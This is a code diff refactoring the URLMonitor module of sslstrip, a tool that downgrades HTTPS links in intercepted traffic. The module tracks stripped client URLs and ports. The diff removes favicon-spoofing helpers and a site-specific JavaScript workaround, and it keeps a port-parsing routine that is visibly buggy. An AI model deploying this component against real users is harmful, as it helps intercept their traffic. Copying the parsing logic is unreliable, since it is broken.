@@ -1,4 +1,4 @@
-# Copyright (c) 2004-2009 Moxie Marlinspike
+# Copyright (c) 2004-2015 Moxie Marlinspike, Tijme Gommers
 #
 # This program is free software; you can redistribute it and/or
 # modify it under the terms of the GNU General Public License as
@@ -14,74 +14,65 @@
 # along with this program; if not, write to the Free Software
 # Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
 # USA
-#
 
 import re
 
+"""
+The URL monitor maintains a set of (client, url) tuples that correspond to requests which the
+server is expecting over SSL.
+"""
 class URLMonitor:    
 
-    '''
-    The URL monitor maintains a set of (client, url) tuples that correspond to requests which the
-    server is expecting over SSL.  It also keeps track of secure favicon urls.
-    '''
+    """
+    Keep track of the URLMonitor instance
+    """
+    _instance = None
 
-    # Start the arms race, and end up here...
-    javascriptTrickery = [re.compile("http://.+\.etrade\.com/javascript/omntr/tc_targeting\.html")]
-    _instance          = None
-
+    """
+    Initialize empty stripped urls and ports object (these will only be maintained for current runtime)
+    """
     def __init__(self):
-        self.strippedURLs       = set()
-        self.strippedURLPorts   = {}
-        self.faviconReplacement = False
+        self.stripped_urls = set()
+        self.stripped_url_ports = {}
 
-    def isSecureLink(self, client, url):
-        for expression in URLMonitor.javascriptTrickery:
-            if (re.match(expression, url)):
-                return True
+    def is_secure_link(self, client, url):
+        return (client, url) in self.stripped_urls
 
-        return (client,url) in self.strippedURLs
-
-    def getSecurePort(self, client, url):
-        if (client,url) in self.strippedURLs:
-            return self.strippedURLPorts[(client,url)]
+    def get_secure_port(self, client, url):
+        if (client, url) in self.stripped_urls:
+            return self.stripped_url_ports[(client, url)]
         else:
             return 443
 
-    def addSecureLink(self, client, url):
-        methodIndex = url.find("//") + 2
-        method      = url[0:methodIndex]
+    def add_secure_link(self, client, url):
+        method_index = url.find("//") + 2
+        method = url[0:method_index]
 
-        pathIndex   = url.find("/", methodIndex)
-        host        = url[methodIndex:pathIndex]
-        path        = url[pathIndex:]
+        path_index = url.find("/", method_index)
+        host = url[method_index:path_index]
+        path = url[path_index:]
 
-        port        = 443
-        portIndex   = host.find(":")
+        port = 443
+        port_index = host.find(":")
 
-        if (portIndex != -1):
-            host = host[0:portIndex]
-            port = host[portIndex+1:]
+        if (port_index != -1):
+            host = host[0:port_index]
+            port = host[port_index+1:]
             if len(port) == 0:
                 port = 443
         
         url = method + host + path
 
-        self.strippedURLs.add((client, url))
-        self.strippedURLPorts[(client, url)] = int(port)
+        self.stripped_urls.add((client, url))
+        self.stripped_url_ports[(client, url)] = int(port)
 
-    def setFaviconSpoofing(self, faviconSpoofing):
-        self.faviconSpoofing = faviconSpoofing
-
-    def isFaviconSpoofing(self):
-        return self.faviconSpoofing
-
-    def isSecureFavicon(self, client, url):
-        return ((self.faviconSpoofing == True) and (url.find("favicon-x-favicon-x.ico") != -1))
-
-    def getInstance():
+    """
+    Get the URLMonitor instance
+    """
+    def get_instance():
         if URLMonitor._instance == None:
             URLMonitor._instance = URLMonitor()
 
         return URLMonitor._instance
 
-    getInstance = staticmethod(getInstance)
+    get_instance = staticmethod(get_instance)
